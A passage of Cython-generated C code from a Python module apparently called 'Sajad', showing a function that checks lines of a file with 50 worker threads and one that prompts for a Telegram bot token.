        __pyx_L32_except_continue:;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        goto __pyx_L11_try_continue;
      }
      goto __pyx_L7_except_error;
      __pyx_L7_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
      goto __pyx_L1_error;
      __pyx_L10_try_break:;
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
      goto __pyx_L4_break;
      __pyx_L11_try_continue:;
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_XGIVEREF(__pyx_t_4);
      __Pyx_XGIVEREF(__pyx_t_5);
      __Pyx_ExceptionReset(__pyx_t_3, __pyx_t_4, __pyx_t_5);
      goto __pyx_L3_continue;
    }
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_os); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_system); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_os); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_name); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_17);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_15 = (__Pyx_PyUnicode_Equals(__pyx_t_17, __pyx_n_u_nt, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
  if (__pyx_t_15) {
    __Pyx_INCREF(__pyx_n_u_cls);
    __pyx_t_1 = __pyx_n_u_cls;
  } else {
    __Pyx_INCREF(__pyx_n_u_clear);
    __pyx_t_1 = __pyx_n_u_clear;
  }
  __pyx_t_17 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
    __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_7);
    if (likely(__pyx_t_17)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
      __Pyx_INCREF(__pyx_t_17);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_7, function);
    }
  }
  __pyx_t_2 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_17, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1);
  __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 415, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 416, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_7 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 416, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_max_workers, __pyx_int_50) < 0) __PYX_ERR(0, 416, __pyx_L1_error)
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_empty_tuple, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 416, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_5 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_exit); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 416, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_2 = __Pyx_PyObject_LookupSpecial(__pyx_t_1, __pyx_n_s_enter); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 416, __pyx_L33_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_17 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_17)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_17);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
      }
    }
    __pyx_t_7 = (__pyx_t_17) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_17) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 416, __pyx_L33_error)
    __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __pyx_t_7;
    __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_3, &__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_4);
        __Pyx_XGOTREF(__pyx_t_3);
        __Pyx_XGOTREF(__pyx_t_6);
        /*try:*/ {
          __pyx_v_executor = __pyx_t_2;
          __pyx_t_2 = 0;

          
          if (unlikely(!__pyx_v_lines)) { __Pyx_RaiseUnboundLocalError("lines"); __PYX_ERR(0, 417, __pyx_L37_error) }
          if (likely(PyList_CheckExact(__pyx_v_lines)) || PyTuple_CheckExact(__pyx_v_lines)) {
            __pyx_t_2 = __pyx_v_lines; __Pyx_INCREF(__pyx_t_2); __pyx_t_12 = 0;
            __pyx_t_18 = NULL;
          } else {
            __pyx_t_12 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_v_lines); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 417, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_18 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 417, __pyx_L37_error)
          }
          for (;;) {
            if (likely(!__pyx_t_18)) {
              if (likely(PyList_CheckExact(__pyx_t_2))) {
                if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_2)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_12); __Pyx_INCREF(__pyx_t_1); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 417, __pyx_L37_error)
                #else
                __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 417, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_1);
                #endif
              } else {
                if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_12); __Pyx_INCREF(__pyx_t_1); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 417, __pyx_L37_error)
                #else
                __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 417, __pyx_L37_error)
                __Pyx_GOTREF(__pyx_t_1);
                #endif
              }
            } else {
              __pyx_t_1 = __pyx_t_18(__pyx_t_2);
              if (unlikely(!__pyx_t_1)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 417, __pyx_L37_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_1);
            }
            __Pyx_XDECREF_SET(__pyx_v_use, __pyx_t_1);
            __pyx_t_1 = 0;

            
            __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_executor, __pyx_n_s_submit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 418, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_chk); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 418, __pyx_L37_error)
            __Pyx_GOTREF(__pyx_t_17);
            __pyx_t_8 = NULL;
            __pyx_t_16 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
              __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
              if (likely(__pyx_t_8)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                __Pyx_INCREF(__pyx_t_8);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_7, function);
                __pyx_t_16 = 1;
              }
            }
            #if CYTHON_FAST_PYCALL
            if (PyFunction_Check(__pyx_t_7)) {
              PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_t_17, __pyx_v_use};
              __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_16, 2+__pyx_t_16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 418, __pyx_L37_error)
              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            } else
            #endif
            #if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_7)) {
              PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_t_17, __pyx_v_use};
              __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_7, __pyx_temp+1-__pyx_t_16, 2+__pyx_t_16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 418, __pyx_L37_error)
              __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            } else
            #endif
            {
              __pyx_t_19 = PyTuple_New(2+__pyx_t_16); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 418, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_19);
              if (__pyx_t_8) {
                __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_t_8); __pyx_t_8 = NULL;
              }
              __Pyx_GIVEREF(__pyx_t_17);
              PyTuple_SET_ITEM(__pyx_t_19, 0+__pyx_t_16, __pyx_t_17);
              __Pyx_INCREF(__pyx_v_use);
              __Pyx_GIVEREF(__pyx_v_use);
              PyTuple_SET_ITEM(__pyx_t_19, 1+__pyx_t_16, __pyx_v_use);
              __pyx_t_17 = 0;
              __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_19, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 418, __pyx_L37_error)
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
            }
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            
          }
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        goto __pyx_L42_try_end;
        __pyx_L37_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source.Sajad.chkfile", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_1, &__pyx_t_7) < 0) __PYX_ERR(0, 416, __pyx_L39_except_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_19 = PyTuple_Pack(3, __pyx_t_2, __pyx_t_1, __pyx_t_7); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 416, __pyx_L39_except_error)
          __Pyx_GOTREF(__pyx_t_19);
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_19, NULL);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
          if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 416, __pyx_L39_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (__pyx_t_15 < 0) __PYX_ERR(0, 416, __pyx_L39_except_error)
          __pyx_t_14 = ((!(__pyx_t_15 != 0)) != 0);
          if (__pyx_t_14) {
            __Pyx_GIVEREF(__pyx_t_2);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_7);
            __Pyx_ErrRestoreWithState(__pyx_t_2, __pyx_t_1, __pyx_t_7);
            __pyx_t_2 = 0; __pyx_t_1 = 0; __pyx_t_7 = 0; 
            __PYX_ERR(0, 416, __pyx_L39_except_error)
          }
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          goto __pyx_L38_exception_handled;
        }
        __pyx_L39_except_error:;
        __Pyx_XGIVEREF(__pyx_t_4);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_6);
        goto __pyx_L1_error;
        __pyx_L38_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_4);
        __Pyx_XGIVEREF(__pyx_t_3);
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_ExceptionReset(__pyx_t_4, __pyx_t_3, __pyx_t_6);
        __pyx_L42_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_5) {
          __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple_, NULL);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 416, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        goto __pyx_L36;
      }
      __pyx_L36:;
    }
    goto __pyx_L48;
    __pyx_L33_error:;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L1_error;
    __pyx_L48:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_17);
  __Pyx_XDECREF(__pyx_t_19);
  __Pyx_AddTraceback("source.Sajad.chkfile", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_filename);
  __Pyx_XDECREF(__pyx_v_user_file);
  __Pyx_XDECREF(__pyx_v_lines);
  __Pyx_XDECREF(__pyx_v_executor);
  __Pyx_XDECREF(__pyx_v_use);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_5tokenbot(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_5tokenbot = {"tokenbot", (PyCFunction)__pyx_pw_6source_5Sajad_5tokenbot, METH_O, 0};
static PyObject *__pyx_pw_6source_5Sajad_5tokenbot(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("tokenbot (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_5Sajad_4tokenbot(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_5Sajad_4tokenbot(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_text = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("tokenbot", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_name); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_6 = (__Pyx_PyUnicode_Equals(__pyx_t_5, __pyx_n_u_nt, Py_EQ)); if (unlikely(__pyx_t_6 < 0)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (__pyx_t_6) {
    __Pyx_INCREF(__pyx_n_u_cls);
    __pyx_t_2 = __pyx_n_u_cls;
  } else {
    __Pyx_INCREF(__pyx_n_u_clear);
    __pyx_t_2 = __pyx_n_u_clear;
  }
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_5, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 421, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_output); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 422, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 422, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 423, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_kp_u_1_32m_Telegram_Token_Giriniz) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_1_32m_Telegram_Token_Giriniz);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 423, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_text = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_console); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 424, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_input); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 424, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_1, __pyx_v_text) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_v_text);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 424, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_token, __pyx_t_3) < 0) __PYX_ERR(0, 424, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_idtle); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 425, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_1)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_1);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_3 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 425, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("source.Sajad.tokenbot", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_text);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_5Sajad_7chk(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds); /*proto*/
static PyMethodDef __pyx_mdef_6source_5Sajad_7chk = {"chk", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_6source_5Sajad_7chk, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_6source_5Sajad_7chk(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_self = 0;
  PyObject *__pyx_v_use = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("chk (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_self,&__pyx_n_s_use,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_self)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_use)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("chk", 1, 2, 2, 1); __PYX_ERR(0, 427, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "chk") < 0)) __PYX_ERR(0, 427, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_self = values[0];
    __pyx_v_use = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("chk", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 427, __pyx_L3_error)
  __pyx_L3_error:;
